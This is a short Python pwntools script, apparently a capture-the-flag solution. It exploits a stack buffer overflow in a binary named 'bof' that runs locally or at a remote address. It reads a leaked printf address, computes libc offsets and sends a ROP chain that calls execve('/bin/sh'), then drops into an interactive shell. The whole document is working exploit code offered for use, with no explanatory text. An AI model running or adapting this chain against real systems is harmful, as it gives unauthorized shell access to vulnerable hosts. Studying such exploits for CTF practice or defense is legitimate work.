#!/usr/bin/python 
#coding: utf-8
__author__ = "TaQini"
from pwn import *
import sys
# context.log_level = 'debug'

if len(sys.argv)>2:
    addr = sys.argv[1]
    port = int(sys.argv[2])  
    p = remote(addr,port)
else:
    p = process('./bof')

libc = ELF("../libc.so.6")

# func addr in libc
printf_libc = libc.symbols['printf']
log.info("printf@libc: " + hex(printf_libc))

system_libc = libc.symbols['execve']
log.info("execve@libc: " + hex(system_libc))

binsh_libc = libc.search('/bin/sh').next()
log.info("binsh@libc: " + hex(binsh_libc))

buflen = 136

# some func leak libc
printf = u64(p.recv(8))
log.info("printf= " + hex(printf))
p.recvuntil("input\n")

# calc offset
offset = printf - printf_libc

# real addr
system = system_libc + offset
log.info("execve= " + hex(system))

binsh = binsh_libc + offset
log.info("binsh= " + hex(binsh))

# gadget in elf
pppr = 0x040062c # pop rdi ; pop rsi ; pop rdx ; ret
log.info("pppr= " + hex(pppr))

payload = ""
payload += "A" * buflen
payload += p64(pppr)
rdi = binsh            # mov    rdx,r13
rsi = 0                # mov    rsi,r14
rdx = 0                # mov    edi,r15
ret = system
payload += p64(rdi) + p64(rsi) + p64(rdx) + p64(ret)

#gdb.attach(p)
p.sendline(payload)

p.interactive()
